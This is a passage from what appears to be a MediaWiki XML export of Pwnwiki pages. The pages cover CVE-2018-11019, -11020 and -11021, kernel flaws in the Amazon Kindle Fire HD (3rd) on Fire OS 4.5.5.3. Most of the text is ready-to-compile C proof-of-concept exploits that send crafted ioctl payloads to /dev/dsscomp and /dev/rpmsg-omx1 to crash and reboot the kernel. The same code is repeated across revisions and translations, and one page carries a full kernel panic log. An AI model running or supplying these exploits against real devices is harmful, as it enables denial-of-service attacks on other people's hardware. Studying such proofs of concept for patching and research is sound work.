[  166.169067] CPU1 PC (9) : 0xc003ee54
[  166.173126] 
[  166.175048] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017
[  166.175079
&lt;/pre&gt;</text>
      <sha1>f4w1rmfbmm1ze8ieqmq9hb8j5abi5b0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11019 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3064</id>
    <revision>
      <id>3565</id>
      <timestamp>2021-05-26T13:42:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響=="</comment>
      <origin>3565</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="16915" sha1="ihcr5qumra7b0rn0hvojkwu92xamw82" xml:space="preserve">&lt;languages  /&gt;
==漏洞影響==
&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.
 * Related buggy struct name is dsscomp_setup_dispc_data.
 * This Poc should run with permission to do ioctl on /dev/dsscomp.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/dsscomp";
static command = 1118064517; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = {
    0xffffffff,
    0x00000003,
    0x5d200040,
    0x79900008,
    0x8f5928bd,
    0x78b02422,
    0x00000000,
    0xffffffff,
    0xf4c50400,
    0x007fffff,
    0x8499f562,
    0xffff0400,
    0x001b131d,
    0x60818210,
    0x00000007,
    0xffffffff,
    0x00000000,
    0x9da9041c,
    0xcd980400,
    0x001f03f4,
    0x00000007,
    0x2a34003f,
    0x7c80d8f3,
    0x63102627,
    0xc73643a8,
    0xa28f0665,
    0x00000000,
    0x689e57b4,
    0x01ff0008,
    0x5e7324b1,
    0xae3b003f,
    0x0b174d86,
    0x00000400,
    0x21ffff37,
    0xceb367a4,
    0x00000040,
    0x00000001,
    0xec000f9e,
    0x00000001,
    0x000001ff,
    0x00000000,
    0x00000000,
    0x0000000f,
    0x0425c069,
    0x038cc3be,
    0x0000000f,
    0x00000080,
    0xe5790100,
    0x5b1bffff,
    0x0000d355,
    0x0000c685,
    0xa0070000,
    0x0010ffff,
    0x00a0ff00,
    0x00000001,
    0xff490700,
    0x0832ad03,
    0x00000006,
    0x00000002,
    0x00000001,
    0x81f871c0,
    0x738019cb,
    0xbf47ffff,
    0x00000040,
    0x00000001,
    0x7f190f33,
    0x00000001,
    0x8295769b,
    0x0000003f,
    0x869f2295,
    0xffffffff,
    0xd673914f,
    0x05055800,
    0xed69b7d5,
    0x00000000,
    0x0107ebbd,
    0xd214af8d,
    0xffff4a93,
    0x26450008,
    0x58df0000,
    0xd16db084,
    0x03ff30dd,
    0x00000001,
    0x209aff3b,
    0xe7850800,
    0x00000002,
    0x30da815c,
    0x426f5105,
    0x0de109d7,
    0x2c1a65fc,
    0xfcb3d75f,
    0x00000000,
    0x00000001,
    0x8066be5b,
    0x00000002,
    0xffffffff,
    0x5cf232ec,
    0x680d1469,
    0x00000001,
    0x00000020,
    0xffffffff,
    0x00000400,
    0xd1d12be8,
    0x02010200,
    0x01ffc16f,
    0xf6e237e6,
    0x007f0000,
    0x01ff08f8,
    0x000f00f9,
    0xbad07695,
    0x00000000,
    0xbaff0000,
    0x24040040,
    0x00000006,
    0x00000004,
    0x00000000,
    0xbc2e9242,
    0x009f5f08,
    0x00800000,
    0x00000000,
    0x00000001,
    0xff8800ff,
    0x00000001,
    0x00000000,
    0x000003f4,
    0x6faa8472,
    0x00000400,
    0xec857dd5,
    0x00000000,
    0x00000040,
    0xffffffff,
    0x3f004874,
    0x0000b77a,
    0xec9acb95,
    0xfacc0001,
    0xffff0001,
    0x0080ffff,
    0x3600ff03,
    0x00000001,
    0x8fff7d7f,
    0x6b87075a,
    0x00000000,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x001001ff,
    0x00000000,
    0x00000001,
    0xff1f0512,
    0x00000001,
    0x51e32167,
    0xc18c55cc,
    0x00000000,
    0xffffffff,
    0xb4aaf12b,
    0x86edfdbd,
    0x00000010,
    0x0000003f,
    0xabff7b00,
    0xffff9ea3,
    0xb28e0040,
    0x000fffff,
    0x458603f4,
    0xffff007f,
    0xa9030f02,
    0x00000001,
    0x002cffff,
    0x9e00cdff,
    0x00000004,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
崩溃日志
[  164.793151] Unable to handle kernel NULL pointer dereference at virtual address 00000037
[  164.802459] pgd = c26ec000
[  164.805664] [00000037] *pgd=82f42831, *pte=00000000, *ppte=00000000
[  164.813415] Internal error: Oops: 17 [#1] PREEMPT SMP ARM
[  164.819458] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)
[  164.827239] CPU: 1    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)
[  164.834686] PC is at dev_ioctl+0x4ac/0x10c4
[  164.839416] LR is at down_timeout+0x40/0x5c
[  164.844146] pc : [&lt;c03178e8&gt;]    lr : [&lt;c006e9b8&gt;]    psr: 60000013
[  164.844146] sp : c25a1e70  ip : c25a1e50  fp : c25a1f04
[  164.857116] r10: 00000000  r9 : d8c0aca8  r8 : bed5c610
[  164.863128] r7 : c0a25b50  r6 : c25a0000  r5 : bed5c610  r4 : 0000000f
[  164.870391] r3 : 00001403  r2 : 00000000  r1 : 20000013  r0 : 00000000
[  164.877807] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
[  164.885894] Control: 10c5387d  Table: 826ec04a  DAC: 00000015
[  164.892303] 
[  164.892333] PC: 0xc0317868:
[  164.897308] 7868  30d22003 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f
[  164.907989] 7888  e3c6603f e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064
[  164.918670] 78a8  e1a01005 e3a02008 e50b3088 e1a00003 ebfcfa5f e3500000 1a00001e e51b4060
[  164.929351] 78c8  e3020710 e59f7bdc ebf4db32 e1a01000 e2870038 ebf55c25 e3500000 1a0002e0
[  164.939880] 78e8  e5943028 e1a08000 e5940024 e1a02007 e2841024 e5803004 e5830000 e5b23070
[  164.950561] 7908  e5871070 e2420038 e5831004 e5843024 e5842028 ebf55bb9 e50b8060 e50b8064
[  164.961212] 7928  ea000006 e24b1064 e50b1088 e51b0088 e3a01008 ebfd0387 e3a03004 e50b3064
[  164.971771] 7948  e5963008 e2952008 30d22003 33a03000 e3530000 1affffc5 e1a00005 e51b1088
[  164.982299] 
[  164.982330] LR: 0xc006e938:
[  164.987426] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005
[  164.997955] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4
[  165.008636] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000
[  165.019317] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794
[  165.029846] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d
[  165.040374] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008
[  165.051055] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004
[  165.061737] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d
[  165.072265] 
[  165.072265] SP: 0xc25a1df0:
[  165.077362] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff
[  165.087890] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013
[  165.098419] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8
[  165.109100] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff
[  165.119781] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920
[  165.130340] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff
[  165.141021] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580
[  165.151702] 1ed0  c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 00000004 c719ab40 bed5c610
[  165.162353] 
[  165.162384] IP: 0xc25a1dd0:
[  165.167327] 1dd0  c0070df8 c00795ac c25a0000 00000001 00000004 d454d0f4 60000013 00000001
[  165.178009] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff
[  165.188537] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013
[  165.199249] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8
[  165.209899] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff
[  165.220581] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920
[  165.231109] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff
[  165.241790] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580
[  165.252441] 
[  165.252441] FP: 0xc25a1e84:
[  165.257415] 1e84  c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff
[  165.268066] 1ea4  0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 00000000
[  165.278717] 1ec4  00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40
[  165.289276] 1ee4  00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 c0136044
[  165.299926] 1f04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440
[  165.310607] 1f24  c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 c25a0000
[  165.321136] 1f44  00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 c25a0000
[  165.331695] 1f64  00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 00000400
[  165.342346] 
[  165.342376] R6: 0xc259ff80:
[  165.347320] ff80  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000
[  165.358001] ffa0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[  165.368682] ffc0  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000
[  165.379241] ffe0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[  165.389770] 0000  00000000 00000002 00000000 d72b0980 c0a0e840 00000001 00000015 c265dc00
[  165.400451] 0020  00000000 c25a0000 c09ddc50 d72b0980 de949300 c1620b40 c25a1b7c c25a1ac8
[  165.411132] 0040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000
[  165.421661] 0060  005634c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000
[  165.432342] 
[  165.432342] R7: 0xc0a25ad0:
[  165.437316] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03
[  165.447875] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005
[  165.458526] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001
[  165.469207] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001
[  165.479736] 5b50  00000000 00000000 00000001 c0a25b5c c0a25b5c c0a25b64 c0a25b64 00000000
[  165.490417] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000
[  165.500946] 5b90  00000000 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001
[  165.511627] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8
[  165.522186] 
[  165.522186] R9: 0xd8c0ac28:
[  165.527282] ac28  d8c0ac28 d8c0ac28 00000000 00000000 00000000 c06bc674 000200da c09dda58
[  165.537841] ac48  00000000 00000000 d8c0ac50 d8c0ac50 00000000 c0aa5174 c0aa5174 c0aa5148
[  165.548492] ac68  5aefbbda 00000000 00000000 00000000 d8c0ac80 00000000 00000000 00000000
[  165.559020] ac88  00200000 00000000 00000000 d8c0ac94 d8c0ac94 dd3f6080 dd3f6080 00000000
[  165.569702] aca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400
[  165.580261] acc8  d8c0ad80 dd3ede70 00001064 00000001 0fb00000 5aefbbda 2e19b832 5aefbbda
[  165.590911] ace8  2e19b832 5aefbbda 2e19b832 00000000 00000000 00000000 00000000 00000000
[  165.601593] ad08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0ad24
[  165.612121] Process gcioctl_poc (pid: 3932, stack limit = 0xc25a02f8)
[  165.619445] Stack: (0xc25a1e70 to 0xc25a2000)
[  165.624359] 1e60:                                     00000001 00000028 000fffff c25a1ea0
[  165.633605] 1e80: c25a1edc c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8
[  165.642822] 1ea0: ffffffff 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14
[  165.652038] 1ec0: 00000000 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000
[  165.661102] 1ee0: c719ab40 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08
[  165.670318] 1f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190
[  165.679565] 1f20: dcf8c440 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004
[  165.688781] 1f40: c25a0000 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004
[  165.697875] 1f60: c25a0000 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000
[  165.707092] 1f80: 00000400 bed5c638 00010e64 00000000 00000036 c0013e08 00000000 c25a1fa8
[  165.716308] 1fa0: c0013c60 c0136578 bed5c638 00010e64 00000004 c0085d9e bed5c610 bed5c610
[  165.725402] 1fc0: bed5c638 00010e64 00000000 00000036 00000000 00000000 00000000 bed5c624
[  165.734619] 1fe0: 00000000 bed5c5f4 000106a4 0002918c 60000010 00000004 00000000 00000000
[  165.743835] Backtrace: 
[  165.746856] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)
[  165.756256] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)
[  165.765502] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)
[  165.774780]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:bed5c638
[  165.783203] Code: e2870038 ebf55c25 e3500000 1a0002e0 (e5943028) 
[  165.793060] Board Information: 
[  165.793060]  Revision : 0001
[  165.793060]  Serial    : 0000000000000000
[  165.793090] SoC Information:
[  165.793090]  CPU    : OMAP4470
[  165.793090]  Rev    : ES1.0
[  165.793121]  Type    : HS
[  165.793121]  Production ID: 0002B975-000000CC
[  165.793121]  Die ID    : 1CC60000-50002FFF-0B00935D-11007004
[  165.793121] 
[  165.844757] ---[ end trace aba846a2af6e75b7 ]---
[  165.850097] Kernel panic - not syncing: Fatal exception
[  165.856109] CPU0: stopping
[  165.859252] Backtrace: 
[  165.862274] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)
[  165.871643]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950
[  165.878784] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)
[  165.887908] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)
[  165.897399] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40/0x70)
[  165.906707] Exception stack(0xd8dcfc38 to 0xd8dcfc80)
[  165.912384] fc20:                                                       c153a9f8 00000000
[  165.921600] fc40: 00000002 c153aa08 00000007 c153a9f8 d8d72210 b6eaf010 d8caee34 bab7375f
[  165.930816] fc60: 00000001 d8dcfcac 0009eded d8dcfc80 c010a5b4 c010a5fc 20070013 ffffffff
[  165.940032]  r6:ffffffff r5:20070013 r4:c010a5fc r3:c010a5b4
[  165.947052] [&lt;c010a534&gt;] (follow_page+0x0/0x238) from [&lt;c010af94&gt;] (__get_user_pages+0x13c/0x3f0)
[  165.957031] [&lt;c010ae58&gt;] (__get_user_pages+0x0/0x3f0) from [&lt;c010b350&gt;] (get_user_pages+0x50/0x58)
[  165.967102] [&lt;c010b300&gt;] (get_user_pages+0x0/0x58) from [&lt;c00ff544&gt;] (get_user_pages_fast+0x64/0x7c)
[  165.977233]  r4:d8caee3c
[  165.980468] [&lt;c00ff4e0&gt;] (get_user_pages_fast+0x0/0x7c) from [&lt;c01eeff0&gt;] (fuse_copy_fill+0x1bc/0x238)
[  165.990905] [&lt;c01eee34&gt;] (fuse_copy_fill+0x0/0x238) from [&lt;c01ef0a4&gt;] (fuse_copy_one+0x38/0x68)
[  166.000579]  r6:d8dcdb00 r5:d8dce000 r4:d8dcfe24 r3:00000000
[  166.007690] [&lt;c01ef06c&gt;] (fuse_copy_one+0x0/0x68) from [&lt;c01efe64&gt;] (fuse_dev_do_read+0x3e4/0x69c)
[  166.017761]  r4:dd243c00
[  166.020874] [&lt;c01efa80&gt;] (fuse_dev_do_read+0x0/0x69c) from [&lt;c01f03c0&gt;] (fuse_dev_read+0x84/0x9c)
[  166.030853] [&lt;c01f033c&gt;] (fuse_dev_read+0x0/0x9c) from [&lt;c0124ecc&gt;] (do_sync_read+0xb0/0xf0)
[  166.040222]  r7:00000000 r6:00000000 r5:00000000 r4:00000000
[  166.047363] [&lt;c0124e1c&gt;] (do_sync_read+0x0/0xf0) from [&lt;c01258f4&gt;] (vfs_read+0xa4/0x148)
[  166.056488] [&lt;c0125850&gt;] (vfs_read+0x0/0x148) from [&lt;c01259d8&gt;] (sys_read+0x40/0x78)
[  166.065093]  r8:00040050 r7:b6eaf010 r6:d8e08900 r5:00000000 r4:00000000
[  166.073547] [&lt;c0125998&gt;] (sys_read+0x0/0x78) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)
[  166.082855]  r8:c0013e08 r7:00000003 r6:b6eaf008 r5:b73828a0 r4:b6eaf010
[  166.091217] CPU0 PC (0) : 0xc0019b2c
[  166.095397] CPU0 PC (1) : 0xc0019b2c
[  166.099456] CPU0 PC (2) : 0xc0019b2c
[  166.103515] CPU0 PC (3) : 0xc0019b2c
[  166.107574] CPU0 PC (4) : 0xc0019b2c
[  166.111785] CPU0 PC (5) : 0xc0019b2c
[  166.115814] CPU0 PC (6) : 0xc0019b2c
[  166.119873] CPU0 PC (7) : 0xc0019b2c
[  166.124084] CPU0 PC (8) : 0xc0019b2c
[  166.128112] CPU0 PC (9) : 0xc0019b2c
[  166.132171] CPU1 PC (0) : 0xc003ee38
[  166.136352] CPU1 PC (1) : 0xc003ee54
[  166.140411] CPU1 PC (2) : 0xc003ee54
[  166.144470] CPU1 PC (3) : 0xc003ee54
[  166.148681] CPU1 PC (4) : 0xc003ee54
[  166.152709] CPU1 PC (5) : 0xc003ee54
[  166.156768] CPU1 PC (6) : 0xc003ee54
[  166.160980] CPU1 PC (7) : 0xc003ee54
[  166.165008] CPU1 PC (8) : 0xc003ee54
[  166.169067] CPU1 PC (9) : 0xc003ee54
[  166.173126] 
[  166.175048] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017
[  166.175079
&lt;/pre&gt;</text>
      <sha1>ihcr5qumra7b0rn0hvojkwu92xamw82</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11020 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞</title>
    <ns>0</ns>
    <id>1047</id>
    <revision>
      <id>1325</id>
      <timestamp>2021-04-10T01:37:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt;  &lt;pre&gt; Fire OS 4.5.5.3 &lt;/pre&gt;   ==POC== &lt;pre&gt; /*  * This is poc of Kindle Fire HD 3rd  * A bug in the ioctl interface..."</comment>
      <origin>1325</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1318" sha1="0suxui6wlablbjcg3tyr9m2xnzs4pbw" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;

&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;


==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the system crash via IOCTL 3221772291.
 * Related buggy struct name is gcicommit.
 * This Poc should run with permission to do ioctl on /dev/rpmsg-omx1.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/rpmsg-omx1";
static command = 3221772291; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = { 0xb5d18de2, 0xf6e48a17, 0x9179c429, 0x89a32e03 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
&lt;/pre&gt;</text>
      <sha1>0suxui6wlablbjcg3tyr9m2xnzs4pbw</sha1>
    </revision>
    <revision>
      <id>1326</id>
      <parentid>1325</parentid>
      <timestamp>2021-04-10T01:38:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1326</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1329" sha1="2m1u359s3jc0ui7j0502gfbi12a1380" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;


==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the system crash via IOCTL 3221772291.
 * Related buggy struct name is gcicommit.
 * This Poc should run with permission to do ioctl on /dev/rpmsg-omx1.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/rpmsg-omx1";
static command = 3221772291; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = { 0xb5d18de2, 0xf6e48a17, 0x9179c429, 0x89a32e03 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
&lt;/pre&gt;</text>
      <sha1>2m1u359s3jc0ui7j0502gfbi12a1380</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11020 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3077</id>
    <revision>
      <id>3578</id>
      <timestamp>2021-05-26T14:02:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2018-11020 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞"</comment>
      <origin>3578</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1293" sha1="1kov5cic7db45fho6otf896j22yyh4x" xml:space="preserve">&lt;languages  /&gt;

==漏洞影響==

&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;


==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the system crash via IOCTL 3221772291.
 * Related buggy struct name is gcicommit.
 * This Poc should run with permission to do ioctl on /dev/rpmsg-omx1.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/rpmsg-omx1";
static command = 3221772291; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = { 0xb5d18de2, 0xf6e48a17, 0x9179c429, 0x89a32e03 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
&lt;/pre&gt;</text>
      <sha1>1kov5cic7db45fho6otf896j22yyh4x</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11021 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞</title>
    <ns>0</ns>
    <id>1050</id>
    <revision>
      <id>1329</id>
      <timestamp>2021-04-10T01:40:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞影響== &lt;!--T:1--&gt; &lt;/translate&gt; &lt;pre&gt; Fire OS 4.5.5.3 &lt;/pre&gt;  ==POC== &lt;pre&gt; /*  * This is poc of Kindle Fire HD 3rd  * A bug in the ioctl i..."</comment>
      <origin>1329</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4009" sha1="7balnemcdhirwgtgmwl1aubz1e8in74" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.
 * Related buggy struct name is dsscomp_setup_dispc_data.
 * This Poc should run with permission to do ioctl on /dev/dsscomp.
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/dsscomp";
static command = 1118064517; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = {
    0xffffffff,
    0x00000003,
    0x5d200040,
    0x79900008,
    0x8f5928bd,
    0x78b02422,
    0x00000000,
    0xffffffff,
    0xf4c50400,
    0x007fffff,
    0x8499f562,
    0xffff0400,
    0x001b131d,
    0x60818210,
    0x00000007,
    0xffffffff,
    0x00000000,
    0x9da9041c,
    0xcd980400,
    0x001f03f4,
    0x00000007,
    0x2a34003f,
    0x7c80d8f3,
    0x63102627,
    0xc73643a8,
    0xa28f0665,
    0x00000000,
    0x689e57b4,
    0x01ff0008,
    0x5e7324b1,
    0xae3b003f,
    0x0b174d86,
    0x00000400,
    0x21ffff37,
    0xceb367a4,
    0x00000040,
    0x00000001,
    0xec000f9e,
    0x00000001,
    0x000001ff,
    0x00000000,
    0x00000000,
